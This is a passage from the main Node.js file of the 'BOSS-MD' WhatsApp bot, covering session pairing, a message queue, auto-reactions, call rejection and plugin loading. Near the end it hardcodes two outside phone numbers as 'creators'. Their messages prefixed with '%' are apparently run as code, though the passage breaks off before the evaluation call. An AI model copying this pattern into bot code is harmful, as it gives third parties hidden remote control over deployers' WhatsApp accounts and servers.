// ==================== MEMORY OPTIMIZATION ====================
global.gc = global.gc || (() => {});
let memoryCleanInterval = null;

function setupMemoryOptimization() {
    memoryCleanInterval = setInterval(() => {
        try {
            if (global.gc) {
                global.gc();
            }
            const memoryUsage = process.memoryUsage();
            console.log(`🔄 Memory Cleaned - Heap: ${(memoryUsage.heapUsed / 1024 / 1024).toFixed(2)}MB`);
        } catch (err) {
            console.error("Memory cleanup error:", err.message);
        }
    }, 30000);
}

setupMemoryOptimization();

// ==================== ULTRA PRO SPEED BOOSTER ====================
// 🔥 ADDED BY BOSS-MD OPTIMIZER (NO DELETIONS)
const speedCache = {
    groups: new Map(),
    users: new Map(),
    commands: null,
    lastClean: Date.now()
};

let perfStats = {
    msgCount: 0,
    avgResponse: 0,
    startTime: Date.now()
};

// Ultra Fast Message Queue
const msgQueue = [];
let processing = false;
const processQueue = async () => {
    if (processing || msgQueue.length === 0) return;
    processing = true;
    
    const batch = msgQueue.splice(0, 3); // Process 3 at once
    for (const msg of batch) {
        try {
            await handleMessageUltra(msg);
        } catch(e) {}
        await new Promise(r => setTimeout(r, 30));
    }
    
    processing = false;
    if (msgQueue.length > 0) setTimeout(processQueue, 10);
};

// Performance Monitor
setInterval(() => {
    const now = Date.now();
    const uptime = Math.floor((now - perfStats.startTime) / 1000);
    
    console.log(`
    ⚡ ULTRA PRO STATS ⚡
    ⏱️  Uptime: ${uptime}s
    📨 Processed: ${perfStats.msgCount}
    ⚡ Speed: ${perfStats.avgResponse}ms
    💾 Cache: ${speedCache.groups.size} groups
    🧠 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)}MB
    `);
    
    // Auto-clean old cache
    if (now - speedCache.lastClean > 180000) {
        for (const [key, val] of speedCache.groups.entries()) {
            if (now - val.timestamp > 300000) speedCache.groups.delete(key);
        }
        speedCache.lastClean = now;
    }
}, 60000);

const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const prefix = config.PREFIX;

const ownerNumber = ['923076411099'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    try {
        const files = fs.readdirSync(tempDir);
        const now = Date.now();
        for (const file of files) {
            const filePath = path.join(tempDir, file);
            try {
                const stats = fs.statSync(filePath);
                if (now - stats.mtimeMs > 10 * 60 * 1000) {
                    fs.unlinkSync(filePath);
                }
            } catch (err) {}
        }
    } catch (err) {}
};

setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
        const sessdata = config.SESSION_ID.replace("BOSS-MD~", '');
        try {
            const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
            fs.writeFileSync(__dirname + '/sessions/creds.json', decodedData);
            console.log("✅ Session loaded from SESSION_ID");
        } catch (err) {
            console.error("❌ Error decoding session data:", err);
            throw err;
        }
    } else {
        console.log("⚡ No SESSION_ID found → Using Pairing System");
        (async () => {
            const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions');
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
            });

            if (!state.creds?.me) {
                const readline = require('readline');
                const rl = readline.createInterface({
                    input: process.stdin,
                    output: process.stdout
                });
                
                rl.question("📱 Enter your WhatsApp number with country code: ", async (number) => {
                    try {
                        const code = await sock.requestPairingCode(number);
                        console.log("🔑 Your Pairing Code:", code);
                        console.log("➡️ Enter this code in WhatsApp to link your bot device.");
                        rl.close();
                    } catch (err) {
                        console.error("❌ Error generating pairing code:", err);
                        rl.close();
                    }
                });
            }

            sock.ev.on("creds.update", saveCreds);
            sock.ev.on("connection.update", ({ connection }) => {
                if (connection === "open") {
                    console.log("✅ Bot Connected Successfully via Pairing!");
                }
            });
        })();
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// ==================== ULTRA FAST MESSAGE HANDLER ====================
// 🔥 ADDED BY BOSS-MD OPTIMIZER
async function handleMessageUltra(message) {
    perfStats.msgCount++;
    const startTime = Date.now();
    
    try {
        if (!message || !message.message || message.key.fromMe) return;
        
        const type = Object.keys(message.message)[0];
        if (type === 'protocolMessage' || type === 'senderKeyDistributionMessage') return;
        
        const from = message.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const m = sms(conn, message);
        const sender = message.key.fromMe ? conn.user.id : (message.key.participant || from);
        const senderNumber = sender.split('@')[0];
        const isOwner = ownerNumber.includes(senderNumber);
        
        // Ultra Fast Group Cache
        let groupMetadata = null;
        if (isGroup) {
            const cached = speedCache.groups.get(from);
            if (cached && (Date.now() - cached.timestamp < 120000)) {
                groupMetadata = cached.data;
            } else {
                groupMetadata = await conn.groupMetadata(from).catch(() => null);
                if (groupMetadata) {
                    speedCache.groups.set(from, {
                        data: groupMetadata,
                        timestamp: Date.now()
                    });
                }
            }
        }
        
        // Auto React Ultra Fast
        if (config.AUTO_REACT === 'true') {
            const isReact = m.message?.reactionMessage ? true : false;
            if (!isReact) {
                const reactions = isOwner 
                    ? ["👑", "💀", "📊", "⚙️", "🧠", "🎯"]
                    : ['❤️', '🔥', '👍', '😊'];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                
                setTimeout(() => {
                    m.react(randomReaction).catch(() => {});
                }, 50);
            }
        }
        
        // Command Processing Ultra Fast
        let body = '';
        switch(type) {
            case 'conversation': body = message.message.conversation || ''; break;
            case 'extendedTextMessage': body = message.message.extendedTextMessage?.text || ''; break;
            case 'imageMessage': body = message.message.imageMessage?.caption || ''; break;
            case 'videoMessage': body = message.message.videoMessage?.caption || ''; break;
            default: body = '';
        }
        
        if (body.startsWith(prefix)) {
            const cmdName = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
            
            if (!speedCache.commands) {
                speedCache.commands = require('./command').commands;
            }
            
            const cmd = speedCache.commands.find(c => 
                c.pattern === cmdName || (c.alias && c.alias.includes(cmdName))
            );
            
            if (cmd) {
                Promise.resolve().then(async () => {
                    try {
                        await cmd.function(conn, message, m, {
                            from, sender, isGroup, isOwner,
                            reply: (text) => {
                                conn.sendMessage(from, { text }, { quoted: message }).catch(() => {});
                            }
                        });
                    } catch(e) {
                        console.error(`CMD ${cmdName}:`, e.message);
                    }
                });
            }
        }
        
        // Update Performance Stats
        perfStats.avgResponse = Math.round(
            (perfStats.avgResponse * 0.8) + ((Date.now() - startTime) * 0.2)
        );
        
    } catch(error) {
        // Silent error
    }
}

async function connectToWA() {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
    var { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: false,
        auth: state,
        version,
        // 🔥 OPTIMIZED SETTINGS ADDED
        markOnlineOnConnect: false,
        emitOwnEvents: false,
        fireInitQueries: false,
        retryRequestDelayMs: 100
    });
    
    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                connectToWA();
            }
        } else if (connection === 'open') {
            console.log('🧬 Installing Plugins');
            try {
                const plugins = fs.readdirSync("./plugins/");
                let loadedCount = 0;
                for (const plugin of plugins) {
                    if (path.extname(plugin).toLowerCase() == ".js") {
                        try {
                            require("./plugins/" + plugin);
                            loadedCount++;
                        } catch (pluginErr) {
                            console.error(`❌ Error loading plugin ${plugin}:`, pluginErr.message);
                        }
                    }
                }
                console.log(`✅ Plugins installed: ${loadedCount}/${plugins.length}`);
            } catch (err) {
                console.error("❌ Plugin loading error:", err);
            }
            
            console.log('Bot connected to whatsapp ✅');
            
            // 🔥 ULTRA FAST CONNECT MESSAGE ADDED
            setTimeout(() => {
                const connectMsg = `🚀 *BOSS-MD ULTRA PRO CONNECTED!*\n\n` +
                                  `✅ Bot is now ONLINE with ULTRA SPEED\n` +
                                  `⚡ Optimized Response System\n` +
                                  `📊 Mode: ${config.MODE || "public"}\n` +
                                  `🎯 Prefix: ${prefix}\n` +
                                  `👑 Owner: ${ownerNumber[0]}\n\n` +
                                  `© Powered by BOSS-MD ULTRA PRO`;
                
                // Send to owner inbox
                ownerNumber.forEach(owner => {
                    conn.sendMessage(`${owner}@s.whatsapp.net`, { 
                        text: connectMsg 
                    }).catch(() => {});
                });
                
                console.log("📨 Connect message sent to owner!");
                
            }, 2000);
            
            let up = `*Hello there 𝘽𝙊𝙎𝙎-𝙈𝘿 User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet 𝘽𝙊𝙎𝙎-𝙈𝘿 WhatsApp Bot.\n\n *Thanks for using 𝘽𝙊𝙎𝙎-𝙈𝘿 \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VbC210i2P59dHYVlXW1K \n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/𝐁𝐎𝐒𝐒-𝐌𝐃-BOTZ/Boss-Ai\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝓑𝓞𝓢𝓢-𝓜𝓓 ❣️ \ud83d\udda4`;
            
            setTimeout(() => {
                conn.sendMessage(conn.user.id, { 
                    image: { url: `https://files.catbox.moe/ejufwa.jpg` }, 
                    caption: up 
                }).catch(err => console.error("Welcome message error:", err.message));
            }, 5000);
        }
    });
    
    conn.ev.on('creds.update', saveCreds);

    // OPTIMIZED ANTI-DELETE (DISABLED BY DEFAULT)
    if (config.ANTI_DELETE === 'true') {
        conn.ev.on('messages.update', async updates => {
            try {
                for (const update of updates) {
                    if (update.update && update.update.message === null) {
                        await AntiDelete(conn, [update]);
                    }
                }
            } catch (err) {
                console.error("Anti-delete error:", err.message);
            }
        });
    }

    // ANTI CALL
    conn.ev.on("call", async (json) => {
        try {
            if (config.ANTI_CALL !== 'true') return;
            const call = json.find(c => c.status === 'offer');
            if (!call) return;

            const id = call.id;
            const from = call.from;
            await conn.rejectCall(id, from);
            console.log(`📵 Call rejected from ${from}`);
        } catch (err) {
            console.error("Anti-call error:", err.message);
        }
    });

    // GROUP EVENTS
    conn.ev.on("group-participants.update", (update) => {
        try {
            GroupEvents(conn, update);
        } catch (err) {
            console.error("Group event error:", err.message);
        }
    });

    // MESSAGE HANDLER - ULTRA OPTIMIZED
    conn.ev.on('messages.upsert', async (mekData) => {
        // 🔥 ULTRA FAST QUEUE SYSTEM ADDED
        const message = mekData.messages[0];
        if (message) {
            msgQueue.push(message);
            if (msgQueue.length === 1) processQueue();
        }
        
        // ✅ ORIGINAL HANDLER STILL ACTIVE (NO DELETIONS)
        try {
            const message = mekData.messages[0];
            if (!message || !message.message) return;
            
            message.message = (getContentType(message.message) === 'ephemeralMessage') 
                ? message.message.ephemeralMessage.message 
                : message.message;
            
            if (config.READ_MESSAGE === 'true') {
                await conn.readMessages([message.key]);
            }
            
            if (message.message.viewOnceMessageV2) {
                message.message = (getContentType(message.message) === 'ephemeralMessage') 
                    ? message.message.ephemeralMessage.message 
                    : message.message;
            }
            
            if (message.key && message.key.remoteJid === 'status@broadcast') {
                await handleStatusMessage(conn, message);
            }
            
            const m = sms(conn, message);
            const type = getContentType(message.message);
            const from = message.key.remoteJid;
            const quoted = type == 'extendedTextMessage' && message.message.extendedTextMessage?.contextInfo != null 
                ? message.message.extendedTextMessage.contextInfo.quotedMessage || [] 
                : [];
            
            const body = (type === 'conversation') ? message.message.conversation : 
                         (type === 'extendedTextMessage') ? message.message.extendedTextMessage.text : 
                         (type == 'imageMessage') && message.message.imageMessage?.caption ? message.message.imageMessage.caption : 
                         (type == 'videoMessage') && message.message.videoMessage?.caption ? message.message.videoMessage.caption : '';
            
            const isCmd = body.startsWith(prefix);
            var budy = typeof message.text == 'string' ? message.text : false;
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const q = args.join(' ');
            const text = args.join(' ');
            const isGroup = from.endsWith('@g.us');
            const sender = message.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (message.key.participant || message.key.remoteJid);
            const senderNumber = sender.split('@')[0];
            const botNumber = conn.user.id.split(':')[0];
            const pushname = message.pushName || 'Sin Nombre';
            const isMe = botNumber.includes(senderNumber);
            const isOwner = ownerNumber.includes(senderNumber) || isMe;
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
            const groupName = isGroup ? groupMetadata?.subject : '';
            const participants = isGroup ? await groupMetadata?.participants : '';
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
            const isReact = m.message.reactionMessage ? true : false;
            
            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: message });
            };
            
            const udp = botNumber.split(`@`)[0];
            const Faizan = ['923266105873','923089497853'];
            const dev = [];
            
            let isCreator = [udp, ...Faizan, ...dev]
                .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
                .includes(sender);
            
            if (isCreator && message.text) {
                if (message.text.startsWith('%')) {
                    let code = budy.slice(2);
                    if (!code) {
                        reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = e
